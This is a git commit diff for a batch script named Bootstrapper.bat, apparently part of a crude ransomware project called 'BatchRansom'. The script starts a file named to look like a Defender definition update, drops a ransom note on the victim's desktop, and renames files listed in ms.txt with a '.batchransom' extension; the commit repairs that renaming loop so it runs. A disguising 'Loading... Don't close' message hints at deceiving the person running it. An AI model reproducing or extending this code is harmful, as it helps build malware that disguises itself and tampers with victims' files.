6a9f092eb4f21e35be5b709a5fa36f3bd7f7cf51
FreeVPSMethods <heckervirusads@gmail.com>
2025-01-25 00:26:51 +0100

    Update Bootstrapper.bat

--- Bootstrapper.bat
+++ Bootstrapper.bat
@@ -4,7 +4,7 @@ echo Loading... Don't close.
 start DefenderDefinitionUpdate.bat
 timeout 60
 echo You have been infected by BatchRansom! > %userprofile%\Desktop\READ_ME.txt
-for /f "delims=" %%f in () do (
+for /f "delims=" %%f in (ms.txt) do (
     move "%%f" "%%f.batchransom"
     echo HAPPY BIRTHDAY!
 )
